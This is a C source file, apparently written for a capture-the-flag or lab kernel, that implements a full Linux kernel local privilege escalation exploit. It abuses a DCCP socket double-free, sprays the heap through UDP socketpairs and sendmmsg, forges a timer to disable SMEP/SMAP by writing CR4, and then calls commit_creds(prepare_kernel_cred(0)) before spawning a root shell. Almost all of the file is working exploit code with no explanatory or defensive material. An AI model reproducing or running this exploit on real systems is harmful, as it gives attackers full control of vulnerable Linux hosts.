
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <linux/kernel.h> 

// Needed for local root.
#define COMMIT_CREDS		0xffffffff810a7b90L			
#define PREPARE_KERNEL_CRED	0xffffffff810a7f80L			
#define SHINFO_OFFSET		1728						// skb->end = 0x6c0 = 1728

// Needed for SMEP_SMAP_BYPASS.
#define NATIVE_WRITE_CR4	0xffffffff81065230ul		
#define CR4_DESIRED_VALUE	0x406e0ul
#define TIMER_OFFSET		(744 + 48 + 104)

#define CATCH 4


// Port is incremented on each use.
static int port = 11000;


struct ubuf_info {
	uint64_t callback;		// void (*callback)(struct ubuf_info *, bool)
	uint64_t ctx;			// void *
	uint64_t desc;			// unsigned long
};

struct skb_shared_info {
	uint8_t  nr_frags;		// unsigned char
	uint8_t  tx_flags;		// __u8
	uint16_t gso_size;		// unsigned short
	uint16_t gso_segs;		// unsigned short
	uint16_t gso_type;		// unsigned short
	uint64_t frag_list;		// struct sk_buff *
	uint64_t hwtstamps;		// struct skb_shared_hwtstamps
	uint32_t tskey;			// u32
	uint32_t ip6_frag_id;		// __be32
	uint32_t dataref;		// atomic_t
	uint64_t destructor_arg;	// void *
	uint8_t  frags[16][17];		// skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, void *func) {
	memset(&buffer[0], 0, 2048);

	struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[SHINFO_OFFSET];

	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;

	ui.callback = (unsigned long)func;
}

struct timer_list {
	void			*next;
	void			*prev;
	unsigned long	expires;
	void			(*function)(unsigned long);
	unsigned long	data;
	unsigned int	flags;
	int				slack;
};


// =========================Trigger =========================* * *
struct dccp_handle {
	struct sockaddr_in6 sa;
	int server;
	int client;
};
// init dccp client and server
void dccp_init(struct dccp_handle *handle, int port) {
	handle->sa.sin6_family = AF_INET6;
	handle->sa.sin6_port = htons(port);
	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
	handle->sa.sin6_flowinfo = 0;
	handle->sa.sin6_scope_id = 0;

	handle->server = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);						// 
	if (handle->server == -1) {
		perror("socket(SOCK_DCCP)");
		exit(1);
	}

	int rv = bind(handle->server, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("bind()");
		exit(1);
	}

	rv = listen(handle->server, 0x9);												// sk->sk_state = DCCP_LISTEN									
	if (rv != 0) {
		perror("listen()");
		exit(1);
	}

	int optval = 8;
	rv = setsockopt(handle->server, IPPROTO_IPV6, IPV6_RECVPKTINFO,					// set np->rxopt.bits.rxinfo=1
			&optval, sizeof(optval));
	if (rv != 0) {
		perror("setsockopt(IPV6_RECVPKTINFO)");
		exit(1);
	}

	handle->client = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->server == -1) {
		perror("socket(SOCK_DCCP)");
		exit(1);
	}

	//When dccp is in the listening state, and there is a request for DCCP_PKT_REQUEST, it will reluctantly release the skb.
	rv = connect(handle->client, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("connect(SOCK_DCCP)");
		exit(1);
	}
}

// free skb again when call shutdown
void dccp_kfree_again(struct dccp_handle *handle) {
	int rv = shutdown(handle->server, SHUT_RDWR);
	if (rv != 0) {
		perror("shutdown(SOCK_DCCP)");
		exit(1);
	}
}


// =========================== * Heap spraying =========================* *
struct udp_handle {
	int fds[2];
};

void udp_init(struct udp_handle* handle) {
	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
	if (rv != 0) {
		perror("socketpair()");
		exit(1);
	}
}

void udp_kmalloc(struct udp_handle* handle, char *buffer) {		
	int rv = send(handle->fds[0], buffer, 1536, 0);
	if (rv != 1536) {
		perror("send()");
		exit(1);
	}
}


void udp_kfree(struct udp_handle* handle) {
  	char buffer[2048];
	int rv = recv(handle->fds[1], &buffer[0], 1536, 0);
	if (rv != 1536) {
		perror("recv()");
		exit(1);
	}
}

int timer_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("socket(SOCK_DGRAM)");
		exit(1);
	}
	return s;
}
// create timer
#define CONF_RING_FRAMES 1
void timer_schedule(int handle, int timeout) {
	int optval = TPACKET_V3;
	int rv = setsockopt(handle, SOL_PACKET, PACKET_VERSION,
			&optval, sizeof(optval));
	if (rv != 0) {
		perror("setsockopt(PACKET_VERSION)");
		exit(1);
	}
	struct tpacket_req3 tp;
	memset(&tp, 0, sizeof(tp));
	tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
	tp.tp_block_nr = 1;
	tp.tp_frame_size = getpagesize();
	tp.tp_frame_nr = CONF_RING_FRAMES;
	tp.tp_retire_blk_tov = timeout;
	rv = setsockopt(handle, SOL_PACKET, PACKET_RX_RING,
			(void *)&tp, sizeof(tp));
	if (rv != 0) {
		perror("setsockopt(PACKET_RX_RING)");
		exit(1);
	}
}
// sendmmsg heap spray
void sendmsg_spray(int sock, char *buffer) {
	struct mmsghdr msg[1];

	msg[0].msg_hdr.msg_iovlen = 0;

	// Buffer to kmalloc.
	msg[0].msg_hdr.msg_control = &buffer[0];
	msg[0].msg_hdr.msg_controllen = 2048;

	// Make sendmmsg exit easy with EINVAL.
	msg[0].msg_hdr.msg_name = "root";
	msg[0].msg_hdr.msg_namelen = 1;

	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
	if (rv == -1 && errno != EINVAL) {
		perror("[-] sendmmsg()");
		exit(1);
	}
}

void sendmmsg_kmalloc(int port, char *buffer) {
	int sock[2];

	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
	if (rv != 0) {
		perror("socketpair()");
		exit(1);
	}

	sendmsg_spray(sock[0], buffer);

	close(sock[0]);
}

// =========================== * Heap warming =========================* *
// warm: send and recv UDP

void kmalloc_warm() {
	char tmp[2048];
	struct udp_handle uh[16];
	for (int i = 0; i < 2; i++) {
		udp_init(&uh[i]);
		udp_kmalloc(&uh[i], &tmp[0]);
		udp_kfree(&uh[i]);
	}
}

// =========================== Disabling SMEP/SMAP =========================== 


void init_timer_buffer(char* buffer, void *func, unsigned long arg) {
	memset(&buffer[0], 0, 2048);
	struct timer_list* timer = (struct timer_list *)&buffer[TIMER_OFFSET];
	timer->next = 0;
	timer->prev = 0;
	timer->expires = 4294943360;    // max length
	timer->function = func;
	timer->data = arg;
	timer->flags = 1;
	timer->slack = -1;
}

void kernel_exec_irq(void *func, unsigned long arg) {
	int i;
	struct dccp_handle dh;
	struct udp_handle uh;
	char tmp[2048];
	char buffer[2048];
	int timers[CATCH];

	printf("[.] scheduling %p(%p)\n", func, (void *)arg);
	
	// forge timer on buffer
	memset(&tmp[0], 1, 2048);
	system("pause");
	init_timer_buffer(&buffer[0], func, arg);

	udp_init(&uh);

	kmalloc_warm();

	//dccp init"
	dccp_init(&dh, port++);

	for (i = 0; i < CATCH; i++)
		udp_kmalloc(&uh, &tmp[0]);						

	dccp_kfree_again(&dh);

	//catch 1 -> timer");
	for (i = 0; i < CATCH; i++) {
		udp_kfree(&uh);									
		timers[i] = timer_kmalloc();						// af_packet -> timer
	}
	
 	// create timer
	for (i = 0; i < CATCH; i++)
		timer_schedule(timers[i], 500);						// time = 500   (0.5s)

    // spray timer
	// overwrite timers
	for (i = 0; i < CATCH; i++) {
		udp_kmalloc(&uh, &buffer[0]);						
	}

	printf("[.] waiting for the timer to execute\n");
	sleep(1);

	printf("[.] done\n");
}

void disable_smep_smap() {
	printf("[.] disabling SMEP & SMAP\n");
	kernel_exec_irq((void *)NATIVE_WRITE_CR4, CR4_DESIRED_VALUE);
	printf("[.] SMEP & SMAP should be off now\n");
}

// =========================Getting root =========================* 

// Executes func() from process context.
void kernel_exec(void *func) {
	int i;
	struct dccp_handle dh;
	struct udp_handle uh1, uh2;
	char tmp[2048];
	char buffer[2048];

	printf("[.] executing %p\n", func);
// forge skb on buffer
	memset(&tmp[0], 1, 2048);
	init_skb_buffer(&buffer[0], func);

	udp_init(&uh1);
	udp_init(&uh2);

	kmalloc_warm();

	dccp_init(&dh, port++);

	for (i = 0; i < CATCH; i++)
		udp_kmalloc(&uh1, &tmp[0]);					

	dccp_kfree_again(&dh);

	for (i = 0; i < CATCH; i++)
		udp_kmalloc(&uh2, &tmp[0]);	

	// heap spray ubuf_info
	// step1 : overwrite
	for (i = 0; i < CATCH; i++) {
		udp_kfree(&uh1);									 
		sendmmsg_kmalloc(port++, &buffer[0]);   		// sendmmsg heap spray
	}
	// step 2: free and trigger
	for (i = 0; i < CATCH; i++)
		udp_kfree(&uh2);						 	 
	
	printf("[.] done\n");
}


/*============================================Get root======================================================*/

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;

void get_root_payload(void) {
	commit_creds(prepare_kernel_cred(0));
}

void get_root() {
	printf("[.] getting root\n");
	kernel_exec(&get_root_payload);
	printf("[.] should be root now\n");
}

void fork_shell() {
	pid_t rv;
	rv = fork();
	if (rv == -1) {
		perror("fork()");
		exit(1);
	}
	if (rv == 0) {
		system("/bin/sh");
	}
}

int is_root() {
	int fd = open("/flag", O_RDONLY);
	if (fd == -1)
		return false;
	close(fd);
	return true;
}

void check_root() {
	printf("[.] checking if we got root\n");

	if (!is_root()) {
		printf("[-] something went wrong =(\n");
		return;
	}

	printf("[+] got r00t");
	fork_shell();
}

static bool write_file(const char* file, const char* what, ...)
{
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

    if (unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}

    if (unshare(CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(1);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("write_file(/proc/self/set_groups)");
		exit(1);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("write_file(/proc/self/uid_map)");
		exit(1);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("write_file(/proc/self/gid_map)");
		exit(1);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("sched_setaffinity()");
		exit(1);
	}

	if (system("/sbin/ifconfig lo up") != 0) {
		perror("system(/sbin/ifconfig lo up)");
		exit(1);
	}

	printf("[.] namespace sandbox setup successfully\n");
}

int main() {
	setup_sandbox();

	disable_smep_smap();

	get_root();

	check_root();

	while (true) {
		sleep(100);
	}
	return 0;
}